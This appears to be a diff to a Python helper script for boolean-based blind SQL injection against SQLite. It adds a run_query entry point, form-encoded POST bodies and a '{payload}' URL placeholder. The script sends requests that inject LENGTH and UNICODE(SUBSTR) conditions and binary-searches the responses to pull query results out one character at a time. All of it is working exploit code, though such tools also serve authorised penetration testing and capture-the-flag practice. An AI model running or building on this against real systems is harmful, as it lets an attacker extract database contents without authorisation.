@@ -1,14 +1,32 @@
 """Boolean-based blind SQLi extraction helpers for SQLite."""
 
 import sys
+from urllib.parse import parse_qsl
 
 import requests
 
 MAX_OUT_LENGTH = 80
 
-# ----------------------------
-# Core request + evaluation
-# ----------------------------
+
+# Main API method
+def run_query(query, args):
+    """
+    Extract a single-string result.
+    The query must return exactly one string value
+    """
+    length = get_length(query, args)
+    if length == 0:
+        print("[!] Length is 0 - nothing to extract or query failed.")
+        return ""
+
+    print(f"[*] Extracting {length} characters...")
+    result = ""
+    for pos in range(1, length + 1):
+        result += extract_char(query, pos, args)
+        sys.stdout.write(f"\r[+] Current: {result}")
+        sys.stdout.flush()
+    print()
+    return result
 
 
 def send_request(url, method, data, headers, cookies, timeout):
@@ -24,7 +42,8 @@ def send_request(url, method, data, headers, cookies, timeout):
         else:
             r = requests.post(
                 url,
-                data=data,
+                # Treat --data as an application/x-www-form-urlencoded body.
+                data=parse_qsl(data, keep_blank_values=True) if data else None,
                 headers=headers,
                 cookies=cookies,
                 timeout=timeout,
@@ -79,7 +98,6 @@ def get_length(query, args):
 
     while low <= high:
         mid = (low + high) // 2
-        # SQLite uses LENGTH()
         cond = f"LENGTH(({query}))>{mid}"
         if evaluate(cond, args):
             low = mid + 1
@@ -92,12 +110,11 @@ def get_length(query, args):
 
 
 def extract_char(query, position, args):
-    """Extract one character using binary search on Unicode code point."""
+    # Extract one single character of the query result using binary search
     low, high = 32, 126  # printable ASCII range
 
     while low < high:
         mid = (low + high) // 2
-        # SQLite: UNICODE(SUBSTR(...))
         cond = f"UNICODE(SUBSTR(({query}),{position},1))>{mid}"
         if evaluate(cond, args):
             low = mid + 1
@@ -105,22 +122,6 @@ def extract_char(query, position, args):
             high = mid
 
     return chr(low)
-
-
-def extract_string(query, args):
-    length = get_length(query, args)
-    if length == 0:
-        print("[!] Length is 0 - nothing to extract or query failed.")
-        return ""
-
-    print(f"[*] Extracting {length} characters...")
-    result = ""
-    for pos in range(1, length + 1):
-        result += extract_char(query, pos, args)
-        sys.stdout.write(f"\r[+] Current: {result}")
-        sys.stdout.flush()
-    print()
-    return result
 
 
 # ----------------------------
@@ -133,10 +134,7 @@ def evaluate(cond, args):
 
     # Build request
     if args.method.upper() == "GET":
-        if "*" in args.url:
-            final_url = args.url.replace("*", payload)
-        else:
-            final_url = args.url + payload
+        final_url = args.url.replace("{payload}", payload)
         data = None
     else:
         final_url = args.url
